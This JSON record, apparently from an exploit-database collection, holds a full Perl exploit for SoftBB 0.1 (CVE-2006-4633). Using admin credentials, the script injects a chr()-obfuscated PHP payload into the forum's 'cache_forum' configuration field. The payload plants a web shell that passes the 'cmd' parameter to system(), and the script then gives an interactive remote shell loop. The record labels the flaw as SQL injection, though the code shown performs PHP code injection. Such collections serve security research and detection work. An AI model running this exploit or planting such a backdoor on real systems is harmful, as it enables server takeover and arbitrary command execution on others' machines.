{
  "id": "2300",
  "title": "SoftBB 0.1 - &#039;cmd&#039; Remote Command Execution",
  "cve": "CVE-2006-4633",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n#\r\n# Affected.scr..: SoftBB 0.1\r\n# Poc.ID........: 11060904\r\n# Type..........: PHP code execution, SQL Injection, Full Path Disclosure\r\n# Risk.level....: High\r\n# Vendor.Status.: Unpatched\r\n# Src.download..: softbb.be\r\n# Poc.link......: acid-root.new.fr/poc/11060904.txt\r\n# Advisory.link.: acid-root.new.fr/advisories/10060904.txt\r\n# Credits.......: DarkFig (vuln/exploit/shellcode)\r\n#\r\nuse Getopt::Long;\r\nuse HTTP::Cookies;\r\nuse HTTP::Request;\r\nuse HTTP::Request::Common \"POST\";\r\nuse HTTP::Response;\r\nuse LWP::UserAgent;\r\n\r\nprint STDOUT \"\\n+\", '-' x 69, \"+\\n\";\r\nprint STDOUT \"|            SoftBB 0.1 Remote PHP Code Execution Exploit             |\\n\";\r\nprint STDOUT '+', '-' x 69, \"+\\n\";\r\n\r\nmy($host,$path,$admin,$passwd,$proxh,$proxu,$proxp);\r\nmy $opt = GetOptions(\r\n   'host=s'   =>  \\$host,\r\n   'path=s'   =>  \\$path,\r\n   'admin=s'  =>  \\$admin,\r\n   'passwd=s' =>  \\$passwd,\r\n   'proxh=s'  =>  \\$proxh,\r\n   'proxu=s'  =>  \\$proxu,\r\n   'proxp=s'  =>  \\$proxp);\r\n   \r\nif(!$host or !$admin or !$passwd) {\r\n    print STDOUT \"| Usage: ./xx.pl --host=[www] --path=[/] --admin=[root] --passwd=[XD] |\\n\";\r\n    print STDOUT \"| [Options] : --proxh=[host] --proxu=[username] --proxp=[password] ---|\\n\";\r\n    print STDOUT '+', '-' x 69, \"+\\n\";\r\n    exit(0);\r\n}\r\n\r\nif($host  !~ /http/) {$host = 'http://'.$host;}\r\nif($proxh !~ /http/ && $proxh != '') {$proxh = 'http://'.$proxh.'/';}\r\nif(!$path) {$path = '/';}\r\n\r\nmy $cc = HTTP::Cookies->new();\r\nmy $ua = LWP::UserAgent->new();\r\n   $ua->cookie_jar($cc);\r\n   $ua->agent('0xzilla');\r\n   $ua->timeout(30);\r\n   $ua->proxy(['http'] => $proxh) if $proxh;\r\n\r\nmy $re = POST $host.$path.'login.php', [\r\n         'pseudolog' => $admin,\r\n         'mdp'       => $passwd,\r\n         'souvenir'  => 'auto',\r\n         'Submit'    => 'Connexion'\r\n         ];\r\n   $re->proxy_authorization_basic($proxu, $proxp) if $proxp;\r\n   $ua->request($re);\r\n\r\nmy $re = $ua->get($host.$path.'admin/gest_opt.php');\r\n\r\nif($re->content =~ /Administration/) {\r\n   print STDOUT \" [+]Login successful\";} else {\r\n   print STDOUT \" [-]Error during login\";\r\n   print STDOUT '+', '-' x 69, \"+\\n\";\r\n   exit(0);}\r\n\r\nif($re->content =~ /<input type=\"text\" name=\"nomduforum\"  value=\"(.*?)\" class=\"bouton\" \\/>/) {\r\n   $conf[0] = $1;} else {\r\n   $conf[0] = 'Titre';}\r\n\r\nif($re->content =~ /<input type=\"text\" name=\"mailadmin\" value=\"(.*?)\" class=\"bouton\" \\/>/) {\r\n   $conf[1] = $1; } else {\r\n   $conf[1] = 'root@you.com';}\r\n\r\n   # Bypass magic_quotes_gpc and register_globals limits\r\n   # if(isset($_GET['cmd'])){system(stripslashes($_GET['cmd']));}\r\n\r\nmy $shcode  = \"\\n\".'$shcode  = chr(0x69).chr(0x66).chr(0x28).chr(0x69).chr(0x73).chr(0x73).chr(0x65);';\r\n   $shcode .= \"\\n\".'$shcode .= chr(0x74).chr(0x28).chr(0x24).chr(0x5F).chr(0x47).chr(0x45).chr(0x54);';\r\n   $shcode .= \"\\n\".'$shcode .= chr(0x5B).chr(0x27).chr(0x63).chr(0x6D).chr(0x64).chr(0x27).chr(0x5D);';\r\n   $shcode .= \"\\n\".'$shcode .= chr(0x29).chr(0x29).chr(0x7B).chr(0x73).chr(0x79).chr(0x73).chr(0x74);';\r\n   $shcode .= \"\\n\".'$shcode .= chr(0x65).chr(0x6D).chr(0x28).chr(0x73).chr(0x74).chr(0x72).chr(0x69);';\r\n   $shcode .= \"\\n\".'$shcode .= chr(0x70).chr(0x73).chr(0x6C).chr(0x61).chr(0x73).chr(0x68).chr(0x65);';\r\n   $shcode .= \"\\n\".'$shcode .= chr(0x73).chr(0x28).chr(0x24).chr(0x5F).chr(0x47).chr(0x45).chr(0x54);';\r\n   $shcode .= \"\\n\".'$shcode .= chr(0x5B).chr(0x27).chr(0x63).chr(0x6D).chr(0x64).chr(0x27).chr(0x5D);';\r\n   $shcode .= \"\\n\".'$shcode .= chr(0x29).chr(0x29).chr(0x3B).chr(0x7D).chr(0x0D).chr(0x0A);';\r\n   $shcode .= \"\\n\".'eval($shcode);//';\r\n\r\nmy $re = POST $host.$path.'admin/save_opt.php', [\r\n         'nomduforum'       => $conf[0],        'url'              => $host.$path,\r\n         'mailadmin'        => $conf[1],        'smtp'             => '',\r\n         'nbsondage'        => 0,               'gzip'             => 'false',\r\n         'autmodpseudo'     => 'false',         'afflistdelauto'   => 'true',\r\n         'autorisationsign' => 'true',          'bbcodesign'       => 'true',\r\n         'ipaff'            => 'true',          'affreprapide'     => 'false',\r\n         'mailconf'         => 'false',         'cache_forum'      => \"false; $shcode\",\r\n         'lockforum'        => 'false',         'message_de_lock'  => '',\r\n         'lmax'             => 0,               'hmax'             => 0,\r\n         'pmax'             => 0,               'tmpfreepost'      => 0,\r\n         'membreparpage'    => 0,               'postparpage'      => 0,\r\n         'postparpageaff'   => 0,               'Submit'           => 'Enregistrer+les+options',\r\n         ];\r\n\r\nmy $da = $ua->request($re);\r\nif($da->content =~ /Enregistrement/) {\r\n   print STDOUT \"\\n [+]Shellcode should be written !\";}\r\n   \r\nwhile () {\r\n       print STDOUT \"\\n \\$sh: \";\r\n       chomp($cmd = <STDIN>);\r\n       my $da = $ua->get($host.$path.\"info_options.php?cmd=$cmd\");\r\n       print STDOUT $da->content;\r\n       if($cmd eq \"exit\") {\r\n          print STDOUT '+', '-' x 69, \"+\\n\";\r\n          exit(0);}\r\n}\r\n\r\n# milw0rm.com [2006-09-04]",
  "url": "https://www.exploit-db.com/exploits/2300"
}